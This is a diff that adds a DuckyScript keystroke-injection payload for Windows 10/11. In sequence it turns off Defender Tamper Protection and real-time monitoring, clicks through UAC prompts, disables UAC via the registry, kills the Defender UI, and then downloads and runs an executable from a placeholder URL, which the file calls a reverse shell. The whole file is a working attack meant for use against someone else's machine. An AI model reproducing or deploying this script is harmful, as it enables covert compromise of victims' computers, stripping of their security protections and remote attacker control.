@@ -1,0 +1,99 @@
+REM Title: Advanced Remote Shell Execution via PowerShell and Defender Disabling
+REM Author: haruslah
+REM Version: 1.0
+REM Description: 
+REM   Disables Windows Defender Tamper Protection and Real-time Monitoring,
+REM   attempts to disable UAC, and downloads & executes a reverse shell payload.
+REM Note:
+REM   Replace #DOWNLOAD_URL and #DEST_PATH with your payload URL and desired file path.
+REM   Tested on Windows 10/11. UI navigation may need adjustment per Windows build.
+REM Target: Windows 10/11
+
+REM --- Configuration ---
+DEFINE #DOWNLOAD_URL https://www.example.com/malware.exe
+DEFINE #DEST_PATH C:\ProgramData\malware.exe
+
+REM --- Timing Delays (in ms) ---
+DEFINE #KEY_DELAY 50
+DEFINE #UI_DELAY 500
+DEFINE #LONG_DELAY 2000
+
+REM --- Start of Payload ---
+
+REM Initial delay to allow target system readiness
+DELAY 4000
+
+REM Open Run dialog
+GUI r
+DELAY #UI_DELAY
+
+REM Open Windows Defender Threat Protection page
+STRING WindowsDefender://Threat/
+ENTER
+DELAY #LONG_DELAY
+
+REM Navigate to Tamper Protection toggle (may require adjusting tabs)
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+ENTER
+DELAY #UI_DELAY
+
+REM Navigate to Real-time protection toggle
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+SPACE
+DELAY #LONG_DELAY
+
+REM Confirm action if UAC prompt appears (try ALT+O)
+ALT o
+DELAY #LONG_DELAY
+
+REM Open Run dialog again to start elevated PowerShell
+GUI r
+DELAY #UI_DELAY
+
+REM Start PowerShell as Administrator (self-elevating)
+STRING PowerShell Start-Process PowerShell -Verb RunAs
+ENTER
+DELAY #LONG_DELAY
+
+REM Confirm UAC prompt again (try ALT+O)
+ALT o
+DELAY #LONG_DELAY
+
+REM Optional: Adjust console mode
+STRING mode con: cols=18 lines=1
+ENTER
+
+REM Kill Defender UI process to prevent interference
+STRING taskkill /F /IM SecHealthUI.exe
+ENTER
+DELAY #UI_DELAY
+
+REM Disable Defender real-time monitoring and tamper protection via PowerShell commands
+STRING Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+ENTER
+DELAY #UI_DELAY
+
+REM Disable UAC via registry (requires reboot)
+STRING reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+ENTER
+DELAY #UI_DELAY
+
+REM Download and execute reverse shell payload
+STRING $Down=New-Object System.Net.WebClient; $Url='#DOWNLOAD_URL'; $File='#DEST_PATH'; $Down.DownloadFile($Url,$File); $Exec=New-Object -ComObject Shell.Application; $Exec.ShellExecute($File); exit;
+ENTER
+DELAY #LONG_DELAY
+ENTER
